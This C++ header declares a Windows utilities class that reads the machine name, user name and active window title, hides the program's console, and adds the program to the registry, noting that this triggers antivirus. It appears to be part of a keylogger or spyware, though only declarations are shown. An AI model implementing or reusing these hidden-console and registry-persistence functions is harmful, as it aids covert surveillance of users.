#pragma once

#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <lmcons.h>
#include <stdio.h>
#include <tchar.h>
#include <string>

using namespace std;

#define INFO_BUFFER_SIZE 23767 // Used in GetMachineName()

// Static class containing usefull methods intereacting with Windows OS directly
class Utilities
{
public:

	// GetMachineName() : Return the machine name of the computer running this program
	static string GetMachineName();

	// GetUserName() : Return the user name of the user runnig this program
	static string GetUserName();

	// GetActiveWindow() : Return the title of the current active window displayed on screen
	static string GetActiveWindow();

	//  GetSystemDirectory() : Return the path of the system directory
	static string GetSystemDirectory();

	// HideConsole() : Hide the program console window
	static void HideConsole();

	// AddToRegistry() : Add this program to the registry (Will trigger most anti-virus)
	static void AddToRegistry();
};